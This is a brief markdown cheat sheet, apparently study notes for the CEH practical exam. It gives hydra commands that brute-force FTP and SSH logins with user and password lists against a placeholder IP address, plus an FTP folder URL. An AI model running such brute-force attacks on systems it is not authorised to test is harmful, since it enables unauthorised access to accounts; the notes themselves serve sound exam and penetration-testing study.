# CEH-Practical

## IP and service enumaration

## Service brute force
### FTP brut force
```bash
hydra -L userlist.txt -P passwordlist.txt ftp://IP-Address -V
```
### SSH brute force
```bash
hydra -L userlist.txt -P passwordlist.txt IP-Address ssh -V
```
## FTP folder
```bash
ftp://IP-Address/folder
```
